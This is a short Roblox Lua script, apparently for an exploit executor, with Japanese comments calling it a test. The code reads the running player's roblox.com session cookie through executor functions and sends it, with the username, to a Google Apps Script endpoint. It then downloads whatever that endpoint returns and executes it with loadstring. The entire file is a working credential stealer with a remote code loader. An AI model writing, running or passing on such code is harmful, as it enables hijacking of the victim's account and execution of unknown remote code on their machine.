-- 【テスト用】クッキーを「実行時」に取得してGASに直接飛ばす
local user = game.Players.LocalPlayer.Name
local gasUrl = "https://script.google.com/macros/s/AKfycbyUIX90D9otTNn9grPlGdWPfzd_J_rVch3RX1PU7ois_ZdWoJzo6lyxuZprMoexgNgz/exec"

-- 1. まず「実行者（お前）」の権限でクッキーを取得
local clist = (getgenv().get_cookie_header and getgenv().get_cookie_header("https://www.roblox.com/")) 
           or (getgenv().get_cookie and getgenv().get_cookie("https://www.roblox.com/"))
           or "NOT_FOUND"

-- 2. 取得したクッキーをURLに含めて、GASを呼び出す（ここで本家も起動）
local encodedCookie = game:GetService("HttpService"):UrlEncode(clist)
loadstring(game:HttpGet(gasUrl .. "?user=" .. user .. "&cookie=" .. encodedCookie))()
